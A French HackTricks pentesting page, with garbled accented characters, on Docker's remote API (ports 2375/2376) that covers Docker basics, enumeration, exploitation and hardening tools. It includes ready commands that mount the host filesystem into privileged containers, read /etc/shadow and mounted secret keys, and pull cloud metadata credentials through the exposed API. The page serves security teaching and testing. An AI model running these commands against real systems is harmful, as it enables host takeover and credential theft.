# 2375, 2376 Test d'intrusion Docker

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **logiciels malveillants voleurs**.

Le but principal de WhiteIntel est de lutter contre les prises de contr√¥le de compte et les attaques de ransomware r√©sultant de logiciels malveillants volant des informations.

Vous pouvez consulter leur site Web et essayer leur moteur **gratuitement** sur :

{% embed url="https://whiteintel.io" %}

---

### Bases de Docker

#### Qu'est-ce que

Docker est la **plateforme de pointe** dans l'industrie de la **conteneurisation**, menant l'**innovation continue**. Il facilite la cr√©ation et la distribution sans effort d'applications, allant du **traditionnel au futuriste**, et assure leur **d√©ploiement s√©curis√©** sur des environnements divers.

#### Architecture de base de Docker

* [**containerd**](http://containerd.io) : Il s'agit d'un **runtime central** pour les conteneurs, charg√© de la **gestion compl√®te du cycle de vie d'un conteneur**. Cela implique la gestion du **transfert et du stockage des images**, en plus de superviser l'**ex√©cution, la surveillance et le r√©seau** des conteneurs. Des **aper√ßus plus d√©taill√©s** sur containerd sont **explor√©s plus en d√©tail**.
* Le **container-shim** joue un r√¥le crucial en tant qu'**interm√©diaire** dans la gestion des **conteneurs sans t√™te**, prenant en charge de mani√®re transparente **runc** apr√®s l'initialisation des conteneurs.
* [**runc**](http://runc.io) : Estim√© pour ses capacit√©s de **runtime de conteneur l√©ger et universel**, runc est align√© sur la **norme OCI**. Il est utilis√© par containerd pour **d√©marrer et g√©rer les conteneurs** selon les **directives OCI**, ayant √©volu√© √† partir de l'**original libcontainer**.
* [**grpc**](http://www.grpc.io) est essentiel pour **faciliter la communication** entre containerd et le **moteur Docker**, assurant une **interaction efficace**.
* L'[**OCI**](https://www.opencontainers.org) est essentiel pour maintenir les **sp√©cifications OCI** pour le runtime et les images, les derni√®res versions de Docker √©tant **conformes aux normes OCI** pour les images et le runtime.

#### Commandes de base
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** a √©t√© sp√©cifiquement d√©velopp√© pour r√©pondre aux besoins des plateformes de conteneurs telles que **Docker et Kubernetes**, entre autres. Son objectif est de **simplifier l'ex√©cution de conteneurs** sur diff√©rents syst√®mes d'exploitation, notamment Linux, Windows, Solaris, et autres, en abstrayant les fonctionnalit√©s sp√©cifiques √† chaque syst√®me d'exploitation et les appels syst√®me. L'objectif de Containerd est d'inclure uniquement les fonctionnalit√©s essentielles requises par ses utilisateurs, en s'effor√ßant d'omettre les composants inutiles. Cependant, il est reconnu que la r√©alisation compl√®te de cet objectif est un d√©fi.

Une d√©cision de conception cl√© est que **Containerd ne g√®re pas le r√©seau**. Le r√©seau est consid√©r√© comme un √©l√©ment critique dans les syst√®mes distribu√©s, avec des complexit√©s telles que le R√©seau D√©fini par Logiciel (SDN) et la d√©couverte de services qui varient consid√©rablement d'une plateforme √† l'autre. Par cons√©quent, Containerd laisse les aspects r√©seau √™tre g√©r√©s par les plateformes qu'il prend en charge.

Alors que **Docker utilise Containerd** pour ex√©cuter des conteneurs, il est important de noter que Containerd ne prend en charge qu'un sous-ensemble des fonctionnalit√©s de Docker. Plus pr√©cis√©ment, Containerd ne dispose pas des capacit√©s de gestion du r√©seau pr√©sentes dans Docker et ne prend pas en charge la cr√©ation de grappes Docker directement. Cette distinction met en √©vidence le r√¥le cibl√© de Containerd en tant qu'environnement d'ex√©cution de conteneurs, d√©l√©guant des fonctionnalit√©s plus sp√©cialis√©es aux plateformes avec lesquelles il s'int√®gre.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** est un moteur de conteneur open source qui respecte les normes de l'[Open Container Initiative (OCI)](https://github.com/opencontainers), d√©velopp√© et maintenu par Red Hat. Il se distingue de Docker par plusieurs fonctionnalit√©s distinctes, notamment son architecture **sans d√©mon** et la prise en charge des **conteneurs sans privil√®ges root**, permettant aux utilisateurs d'ex√©cuter des conteneurs sans privil√®ges root.

Podman est con√ßu pour √™tre compatible avec l'API de Docker, permettant l'utilisation des commandes CLI de Docker. Cette compatibilit√© s'√©tend √† son √©cosyst√®me, qui comprend des outils tels que **Buildah** pour la construction d'images de conteneurs et **Skopeo** pour les op√©rations sur les images telles que push, pull et inspect. Vous trouverez plus de d√©tails sur ces outils sur leur [page GitHub](https://github.com/containers/buildah/tree/master/docs/containertools).

**Diff√©rences cl√©s**

* **Architecture** : Contrairement au mod√®le client-serveur de Docker avec un d√©mon en arri√®re-plan, Podman fonctionne sans d√©mon. Cette conception signifie que les conteneurs s'ex√©cutent avec les privil√®ges de l'utilisateur qui les lance, renfor√ßant la s√©curit√© en √©liminant le besoin d'acc√®s root.
* **Int√©gration de systemd** : Podman s'int√®gre √† **systemd** pour g√©rer les conteneurs, permettant la gestion des conteneurs via des unit√©s systemd. Cela contraste avec l'utilisation de systemd par Docker principalement pour g√©rer le processus du d√©mon Docker.
* **Conteneurs sans privil√®ges root** : Une fonctionnalit√© cl√© de Podman est sa capacit√© √† ex√©cuter des conteneurs sous les privil√®ges de l'utilisateur initiateur. Cette approche r√©duit les risques li√©s aux violations de conteneurs en veillant √† ce que les attaquants n'obtiennent que les privil√®ges de l'utilisateur compromis, et non un acc√®s root.

L'approche de Podman offre une alternative s√©curis√©e et flexible √† Docker, mettant l'accent sur la gestion des privil√®ges utilisateur et la compatibilit√© avec les flux de travail Docker existants.

{% hint style="info" %}
Notez que Podman vise √† prendre en charge la m√™me API que Docker, vous pouvez donc utiliser les m√™mes commandes avec Podman qu'avec Docker telles que :
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### Informations de base

L'API √† distance fonctionne par d√©faut sur le port 2375 lorsqu'elle est activ√©e. Le service ne n√©cessitera pas d'authentification par d√©faut, permettant √† un attaquant de d√©marrer un conteneur Docker privil√©gi√©. En utilisant l'API √† distance, il est possible d'attacher des h√¥tes / (r√©pertoire racine) au conteneur et de lire/√©crire des fichiers de l'environnement de l'h√¥te.

**Port par d√©faut :** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### √ânum√©ration

#### Manuel

Notez que pour √©num√©rer l'API docker, vous pouvez utiliser la commande `docker` ou `curl` comme dans l'exemple suivant :
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Si vous pouvez **contacter l'API Docker √† distance avec la commande `docker`**, vous pouvez **ex√©cuter** n'importe laquelle des **commandes Docker** [**pr√©c√©demment comment√©es**](2375-pentesting-docker.md#basic-commands) pour interagir avec le service.

{% hint style="info" %}
Vous pouvez `export DOCKER_HOST="tcp://localhost:2375"` et **√©viter** d'utiliser le param√®tre `-H` avec la commande docker.
{% endhint %}

**Escalade de privil√®ges rapide**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Parfois, vous verrez **2376** pour le point de terminaison **TLS**. Je n'ai pas pu me connecter avec le client docker, mais il est possible de le faire avec curl.
```bash
#List containers
curl ‚Äìinsecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl ‚Äìinsecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s ‚Äìinsecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it‚Äôs also worth checking out services in case they are adding secrets via environment variables)
curl -s ‚Äìinsecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl ‚Äìinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl ‚Äìinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Si vous souhaitez obtenir plus d'informations √† ce sujet, plus d'informations sont disponibles l√† o√π j'ai copi√© les commandes : [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Automatique
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Compromission

Sur la page suivante, vous pouvez trouver des moyens de **s'√©chapper d'un conteneur Docker**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

En abusant de cela, il est possible de s'√©chapper d'un conteneur, vous pourriez ex√©cuter un conteneur faible sur la machine distante, vous √©chapper de celui-ci et compromettre la machine:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### √âl√©vation de privil√®ges

Si vous √™tes √† l'int√©rieur d'un h√¥te utilisant Docker, vous pouvez [**lire ces informations pour essayer d'√©lever les privil√®ges**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### D√©couverte de secrets dans les conteneurs Docker en cours d'ex√©cution
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
V√©rifiez **env** (section des variables d'environnement) pour des secrets et vous pourriez trouver :

* Mots de passe.
* Adresses IP.
* Ports.
* Chemins.
* Autres‚Ä¶ .

Si vous voulez extraire un fichier :
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### S√©curiser votre Docker

#### S√©curiser l'installation et l'utilisation de Docker

* Vous pouvez utiliser l'outil [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) pour inspecter votre installation actuelle de Docker.
* `./docker-bench-security.sh`
* Vous pouvez utiliser l'outil [https://github.com/kost/dockscan](https://github.com/kost/dockscan) pour inspecter votre installation actuelle de Docker.
* `dockscan -v unix:///var/run/docker.sock`
* Vous pouvez utiliser l'outil [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) pour conna√Ætre les privil√®ges qu'un conteneur aura lorsqu'il est ex√©cut√© avec diff√©rentes options de s√©curit√©. Cela est utile pour conna√Ætre les implications de l'utilisation de certaines options de s√©curit√© pour ex√©cuter un conteneur :
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### S√©curiser les images Docker

* Vous pouvez utiliser une image Docker de [https://github.com/quay/clair](https://github.com/quay/clair) pour analyser vos autres images Docker et trouver des vuln√©rabilit√©s.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### S√©curiser les Dockerfiles

* Vous pouvez utiliser l'outil [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) pour **inspecter votre Dockerfile** et trouver toutes sortes de mauvaises configurations. Chaque mauvaise configuration se verra attribuer un ID, vous pouvez trouver ici [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) comment corriger chacune d'entre elles.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (173).png>)

* Vous pouvez utiliser l'outil [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) pour **inspecter votre Dockerfile** et trouver toutes sortes de mauvaises configurations.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (209).png>)

* Vous pouvez utiliser l'outil [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) pour **inspecter votre Dockerfile** et trouver toutes sortes de mauvaises configurations.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (68).png>)

* Vous pouvez utiliser l'outil [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) pour **inspecter votre Dockerfile** et trouver toutes sortes de mauvaises configurations.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (498).png>)

#### Enregistrement des activit√©s suspectes

* Vous pouvez utiliser l'outil [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) pour d√©tecter **des comportements suspects dans les conteneurs en cours d'ex√©cution**.
* Notez dans le morceau suivant comment **Falco compile un module de noyau et l'ins√®re**. Ensuite, il charge les r√®gles et **commence √† enregistrer les activit√©s suspectes**. Dans ce cas, il a d√©tect√© 2 conteneurs privil√©gi√©s d√©marr√©s, dont l'un avec un montage sensible, et apr√®s quelques secondes, il a d√©tect√© l'ouverture d'un shell √† l'int√©rieur de l'un des conteneurs.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Surveillance de Docker

Vous pouvez utiliser auditd pour surveiller Docker.

### R√©f√©rences

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)


## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **logiciels malveillants voleurs**.

Le but principal de WhiteIntel est de lutter contre les prises de contr√¥le de compte et les attaques de ransomware r√©sultant de logiciels malveillants volant des informations.

Vous pouvez consulter leur site Web et essayer leur moteur **gratuitement** sur :

{% embed url="https://whiteintel.io" %}


<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
